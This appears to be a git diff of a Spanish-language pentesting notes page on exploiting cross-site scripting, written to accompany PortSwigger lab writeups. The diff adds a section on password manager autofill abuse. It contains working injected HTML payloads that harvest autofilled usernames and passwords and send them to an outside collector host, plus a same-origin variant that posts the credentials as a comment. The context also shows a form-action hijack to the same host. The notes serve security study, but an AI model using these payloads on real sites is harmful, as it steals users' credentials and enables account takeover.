@@ -1,13 +1,13 @@
 ---
 title: Explotación de Cross-Site Scripting (XSS)
 slug: explotacion-xss
-aliases: [XSS exploitation, cookie hijacking, session theft, BeEF, form override, keylogger client-side, XSS to CSRF, XSS chain, same-origin auto-exfiltration]
+aliases: [XSS exploitation, cookie hijacking, session theft, BeEF, form override, keylogger client-side, XSS to CSRF, XSS chain, same-origin auto-exfiltration, password manager autofill abuse, credential capture]
 fase: [Explotación]
 plataforma: Web
 dificultad: Intermedia
 mitre: [T1539, T1185, T1059.007]
 related: [analisis-xss, analisis-csrf, analisis-seguridad-cabeceras]
-learning_refs: [portswigger/exploiting-xss-to-steal-cookies, portswigger/exploiting-xss-to-bypass-csrf-defenses]
+learning_refs: [portswigger/exploiting-xss-to-steal-cookies, portswigger/exploiting-xss-to-capture-passwords, portswigger/exploiting-xss-to-bypass-csrf-defenses]
 ---
 
 # Explotación de Cross-Site Scripting (XSS)
@@ -109,6 +109,36 @@ login.action = 'https://COLLAB.oastify.com/log';
 
 > **Variante dinámica**: si el form se inyecta vía AJAX después del page load, usar un `MutationObserver` o `setInterval` para esperar a que aparezca antes de sobrescribir el action. Mismo patrón de timing que `DOMContentLoaded`.
 
+### Password manager autofill abuse
+Distinta de la sobrescritura de form action: aquí no hay form previo, lo inyectamos. Funciona porque los password managers (incluido el integrado del navegador) autocompletan silenciosamente cuando detectan inputs `name=username` + `type=password` en cualquier página del dominio donde tienen credenciales guardadas. La víctima no teclea nada; el browser rellena solo y un `onchange` exfiltra.
+
+```html
+<!-- Inyectado dentro de un comentario stored XSS -->
+<input name=username id=username>
+<input type=password name=password onchange="
+    if(this.value.length)
+        fetch('https://COLLAB.oastify.com',{method:'POST',mode:'no-cors',body:username.value+':'+this.value});
+">
+```
+
+```html
+<!-- Variante same-origin para entornos con firewall (ver writeup capture-passwords) -->
+<input name=username id=username>
+<input type=password name=password onchange="
+if(this.value.length){
+    fetch('/post/comment',{
+        method:'POST',
+        headers:{'Content-Type':'application/x-www-form-urlencoded'},
+        body:'csrf='+document.getElementsByName('csrf')[0].value
+            +'&postId='+new URLSearchParams(location.search).get('postId')
+            +'&name=stolen&email=a@a.com&website=http://a.com'
+            +'&comment='+encodeURIComponent(username.value+':'+this.value)
+    });
+}">
+```
+
+> **Por qué `username.value` funciona sin `getElementById`**: HTML define que cualquier elemento con `id` se expone como propiedad global del `window`. Es legacy pero universal. Útil cuando el payload tiene que ser corto. `autocomplete="off"` en el form **no defiende** porque la mayoría de password managers lo ignoran.
+
 ### Keylogger client-side
 Captura cada tecla pulsada en la página y la exfiltra. Útil para apps donde el form crítico (transferir dinero, cambiar password) se rellena después del login.
 
@@ -207,4 +237,5 @@ Blind SQLi OOB         | Collaborator (DNS, HTTP)      | NO viable, requiere Pro
 - Stuttard, D., & Pinto, M. (2011). *The Web Application Hacker's Handbook* (2nd ed.). Wiley. Capítulo 12 (Attacking Users: Cross-Site Scripting).
 - Hoffman, A. (2020). *Web Application Security: Exploitation and Countermeasures for Modern Web Applications*. O'Reilly Media.
 - Writeup propio: [`learning/portswigger/exploiting-xss-to-steal-cookies/writeup.md`](../../../learning/portswigger/exploiting-xss-to-steal-cookies/writeup.md) - cookie hijack via auto-exfiltración same-origin (firewall del lab + DOM timing).
+- Writeup propio: [`learning/portswigger/exploiting-xss-to-capture-passwords/writeup.md`](../../../learning/portswigger/exploiting-xss-to-capture-passwords/writeup.md) - captura de user:password via password manager autofill abuse + onchange handler.
 - Writeup propio: [`learning/portswigger/exploiting-xss-to-bypass-csrf-defenses/writeup.md`](../../../learning/portswigger/exploiting-xss-to-bypass-csrf-defenses/writeup.md) - chain XSS hacia change-email vía lectura same-origin del token CSRF.
